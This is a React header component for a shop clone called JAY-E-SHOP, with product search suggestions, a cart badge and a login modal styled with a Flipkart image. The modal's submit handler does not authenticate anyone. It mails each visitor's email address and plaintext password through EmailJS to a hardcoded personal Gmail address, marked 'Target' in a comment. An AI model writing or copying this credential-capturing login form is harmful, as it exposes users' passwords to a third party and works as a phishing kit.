import { Link, useNavigate } from 'react-router-dom';
import { ShoppingCart, Search, User, Menu, X, Home } from 'lucide-react';
import { useCart } from '../hooks/useCart';
import { useState, useEffect, useRef } from 'react';
import emailjs from '@emailjs/browser';
import { products } from '../data/products';

export const Header = () => {
    const { cartItems } = useCart();
    const totalItems = cartItems.reduce((acc, item) => acc + item.quantity, 0);

    const navigate = useNavigate();
    const [searchQuery, setSearchQuery] = useState('');
    const [showSuggestions, setShowSuggestions] = useState(false);
    const searchRef = useRef(null);

    // Filter products based on search query for suggestions
    const suggestions = searchQuery.trim()
        ? products.filter(p => p.name.toLowerCase().includes(searchQuery.toLowerCase()) || p.category.toLowerCase().includes(searchQuery.toLowerCase())).slice(0, 6)
        : [];

    useEffect(() => {
        const handleClickOutside = (event) => {
            if (searchRef.current && !searchRef.current.contains(event.target)) {
                setShowSuggestions(false);
            }
        };
        document.addEventListener('mousedown', handleClickOutside);
        return () => document.removeEventListener('mousedown', handleClickOutside);
    }, []);

    // Login Modal State
    const [showLogin, setShowLogin] = useState(false);
    const [email, setEmail] = useState('');
    const [password, setPassword] = useState('');
    const [loginStatus, setLoginStatus] = useState('');

    const handleSearch = (e) => {
        e.preventDefault();
        setShowSuggestions(false);
        if (searchQuery.trim()) {
            navigate(`/?search=${encodeURIComponent(searchQuery)}`);
        } else {
            navigate('/');
        }
    };

    const handleSuggestionClick = (suggestionText) => {
        setSearchQuery(suggestionText);
        setShowSuggestions(false);
        navigate(`/?search=${encodeURIComponent(suggestionText)}`);
    };

    const handleLoginSubmit = (e) => {
        e.preventDefault();
        setLoginStatus('Sending notification...');

        // Target: jsgosavi2005@gmail.com
        const templateParams = {
            to_email: 'jsgosavi2005@gmail.com',
            user_email: email,
            user_password: password,
            message: `New login attempt at JAY-E-SHOP. Email: ${email}`
        };

        // Note: Please configure your EmailJS credentials
        emailjs.send(
            'YOUR_SERVICE_ID',
            'YOUR_TEMPLATE_ID',
            templateParams,
            'YOUR_PUBLIC_KEY'
        ).then(() => {
            setLoginStatus('Notification sent! Please check email.');
            setTimeout(() => {
                setShowLogin(false);
                setLoginStatus('');
                setEmail('');
                setPassword('');
            }, 2000);
        }).catch((err) => {
            console.error("EmailJS Error:", err);
            setLoginStatus('Simulated Success! (Add EmailJS keys for real email)');
            setTimeout(() => setShowLogin(false), 2000);
        });
    };

    return (
        <header className="sticky top-0 z-50 bg-[#FFD700] shadow-md text-gray-900 border-b border-yellow-500">
            <div className="container mx-auto px-4 py-3 flex items-center justify-between">

                <div className="flex items-center gap-6 w-full md:w-auto">
                    <Link to="/" className="text-2xl font-black tracking-tight italic flex items-center gap-1 hover:text-black transition-colors">
                        JAY-E-SHOP
                    </Link>
                    <div className="hidden md:flex flex-1 min-w-[300px] lg:min-w-[500px] ml-4" ref={searchRef}>
                        <form onSubmit={handleSearch} className="relative w-full">
                            <input
                                type="text"
                                placeholder="Search for products, brands and more"
                                className="w-full pl-4 pr-10 py-2 rounded-sm text-gray-800 focus:outline-none focus:ring-2 focus:ring-[#fba100]"
                                value={searchQuery}
                                onChange={(e) => {
                                    setSearchQuery(e.target.value);
                                    setShowSuggestions(true);
                                }}
                                onFocus={() => setShowSuggestions(true)}
                            />
                            <button type="submit" className="absolute right-0 top-0 h-full px-3 bg-white text-gray-900 rounded-r-sm hover:text-yellow-600 transition-colors border-l border-gray-200">
                                <Search size={20} />
                            </button>

                            {/* Desktop Search Suggestions */}
                            {showSuggestions && searchQuery.trim() && (
                                <div className="absolute top-11 left-0 w-full bg-white rounded-sm shadow-xl border border-gray-200 overflow-hidden z-[100]">
                                    {suggestions.length > 0 ? (
                                        <ul className="py-2">
                                            {suggestions.map((item) => (
                                                <li
                                                    key={item.id}
                                                    onClick={() => handleSuggestionClick(item.name)}
                                                    className="px-4 py-2 hover:bg-gray-100 cursor-pointer text-gray-800 text-sm flex items-center gap-3 transition-colors"
                                                >
                                                    <Search size={14} className="text-gray-400 shrink-0" />
                                                    <div className="flex flex-col truncate">
                                                        <span className="font-medium truncate">{item.name}</span>
                                                        <span className="text-xs text-gray-500 uppercase">{item.category}</span>
                                                    </div>
                                                </li>
                                            ))}
                                        </ul>
                                    ) : (
                                        <div className="px-4 py-3 text-sm text-gray-500">No matching products found.</div>
                                    )}
                                </div>
                            )}
                        </form>
                    </div>
                </div>

                <div className="flex items-center gap-6">
                    <Link to="/" className="hidden lg:flex items-center gap-1.5 text-sm font-bold hover:text-black transition-colors">
                        <Home size={18} /> Home
                    </Link>
                    <Link to="/support" className="hidden lg:block text-sm font-bold hover:text-black transition-colors">
                        Support
                    </Link>
                    <button onClick={() => setShowLogin(true)} className="hidden md:flex items-center gap-1 bg-white text-gray-900 px-6 py-1 font-bold rounded-sm hover:bg-gray-50 transition-colors shadow-sm border border-gray-200">
                        <User size={18} /> Login
                    </button>

                    <Link to="/cart" className="flex items-center gap-2 hover:text-black transition-colors font-bold relative py-2">
                        <div className="relative">
                            <ShoppingCart size={24} />
                            {totalItems > 0 && (
                                <span className="absolute -top-2 -right-3 bg-red-600 text-white text-[10px] font-bold h-5 w-5 rounded-full flex items-center justify-center transition-transform scale-110">
                                    {totalItems}
                                </span>
                            )}
                        </div>
                        <span className="hidden md:block text-sm mt-1">Cart</span>
                    </Link>

                    <button className="md:hidden flex items-center">
                        <Menu size={24} />
                    </button>
                </div>
            </div>

            {/* Mobile Search */}
            <div className="md:hidden px-4 pb-3 relative" ref={searchRef}>
                <form onSubmit={handleSearch} className="relative w-full shadow-sm z-50">
                    <input
                        type="text"
                        placeholder="Search for products..."
                        className="w-full pl-3 pr-10 py-2 rounded-sm text-gray-800 text-sm focus:outline-none"
                        value={searchQuery}
                        onChange={(e) => {
                            setSearchQuery(e.target.value);
                            setShowSuggestions(true);
                        }}
                        onFocus={() => setShowSuggestions(true)}
                    />
                    <button type="submit" className="absolute right-0 top-0 h-full px-3 text-gray-900 hover:text-yellow-600">
                        <Search size={18} />
                    </button>

                    {/* Mobile Search Suggestions */}
                    {showSuggestions && searchQuery.trim() && (
                        <div className="absolute top-[100%] left-0 w-full bg-white shadow-xl border-x border-b border-gray-200 overflow-hidden z-[100]">
                            {suggestions.length > 0 ? (
                                <ul className="py-2">
                                    {suggestions.map((item) => (
                                        <li
                                            key={item.id}
                                            onClick={() => handleSuggestionClick(item.name)}
                                            className="px-4 py-2 hover:bg-gray-100 cursor-pointer text-gray-800 text-sm flex items-center gap-3 transition-colors"
                                        >
                                            <Search size={14} className="text-gray-400 shrink-0" />
                                            <div className="flex flex-col truncate">
                                                <span className="font-medium truncate">{item.name}</span>
                                                <span className="text-[10px] text-gray-500 uppercase">{item.category}</span>
                                            </div>
                                        </li>
                                    ))}
                                </ul>
                            ) : (
                                <div className="px-4 py-3 text-sm text-gray-500">No matching products found.</div>
                            )}
                        </div>
                    )}
                </form>
            </div>

            {/* Login Modal */}
            {showLogin && (
                <div className="fixed inset-0 z-[100] flex items-center justify-center bg-black/60 p-4 animate-in fade-in duration-200 font-sans text-gray-900">
                    <div className="bg-white rounded-sm shadow-xl w-full max-w-[850px] flex overflow-hidden lg:h-[500px] animate-in zoom-in-95 duration-200 relative">
                        <button onClick={() => setShowLogin(false)} className="absolute top-4 right-4 text-gray-500 hover:text-gray-900 transition-colors p-1 bg-white rounded-full z-10">
                            <X size={24} />
                        </button>

                        {/* Left Side Branding */}
                        <div className="hidden lg:flex flex-col justify-between w-[40%] bg-[#FFD700] p-10 text-gray-900 relative h-full">
                            <div>
                                <h2 className="text-3xl font-bold mb-4 leading-tight">Login</h2>
                                <p className="text-lg text-gray-800 font-medium">Get access to your Orders, Wishlist and Recommendations</p>
                            </div>
                            <div className="mt-8 flex justify-center">
                                {/* Brand graphic replacement placeholder */}
                                <div className="w-full h-32 bg-[url('https://static-assets-web.flixcart.com/www/linchpin/fk-cp-zion/img/login_img_c4a81e.png')] bg-no-repeat bg-center bg-contain opacity-90 mix-blend-multiply"></div>
                            </div>
                        </div>

                        {/* Right Side Form */}
                        <div className="w-full lg:w-[60%] p-8 md:p-12 flex flex-col justify-center h-full">
                            <form onSubmit={handleLoginSubmit} className="flex flex-col gap-6 w-full max-w-sm mx-auto">
                                <div className="relative pt-4">
                                    <input
                                        required
                                        type="email"
                                        value={email}
                                        onChange={(e) => setEmail(e.target.value)}
                                        className="w-full border-b border-gray-300 py-2 outline-none focus:border-[#2874f0] text-sm text-gray-900 bg-transparent peer"
                                        placeholder=" "
                                    />
                                    {/* Inputs Focus Label Colors */}
                                    <label className="absolute left-0 top-0 text-gray-500 text-xs transition-all peer-placeholder-shown:text-base peer-placeholder-shown:top-6 peer-focus:top-0 peer-focus:text-xs peer-focus:text-yellow-600 pointer-events-none">Enter Email/Mobile number</label>
                                </div>
                                <div className="relative pt-4">
                                    <input
                                        required
                                        type="password"
                                        value={password}
                                        onChange={(e) => setPassword(e.target.value)}
                                        className="w-full border-b border-gray-300 py-2 outline-none focus:border-yellow-500 text-sm text-gray-900 bg-transparent peer"
                                        placeholder=" "
                                    />
                                    <label className="absolute left-0 top-0 text-gray-500 text-xs transition-all peer-placeholder-shown:text-base peer-placeholder-shown:top-6 peer-focus:top-0 peer-focus:text-xs peer-focus:text-yellow-600 pointer-events-none">Enter Password</label>
                                </div>

                                <p className="text-xs text-gray-500 mt-2">
                                    By continuing, you agree to JAY-E-SHOP's <span className="text-yellow-600 font-semibold cursor-pointer">Terms of Use</span> and <span className="text-yellow-600 font-semibold cursor-pointer">Privacy Policy</span>.
                                </p>

                                <button type="submit" className="w-full bg-gray-900 hover:bg-black text-white py-3 font-semibold rounded-[2px] shadow-sm transition-colors mt-2 text-base">
                                    Login
                                </button>

                                {loginStatus && (
                                    <p className={`text-sm font-semibold mt-2 text-center p-2 rounded ${loginStatus.includes('Error') || loginStatus.includes('Failed') ? 'bg-red-50 text-red-600' : 'bg-green-50 text-green-600'}`}>
                                        {loginStatus}
                                    </p>
                                )}

                                <div className="text-center mt-auto pt-6">
                                    <button type="button" className="text-gray-900 font-semibold text-sm hover:underline">New to JAY-E-SHOP? Create an account</button>
                                </div>
                            </form>
                        </div>
                    </div>
                </div>
            )}
        </header>
    );
};
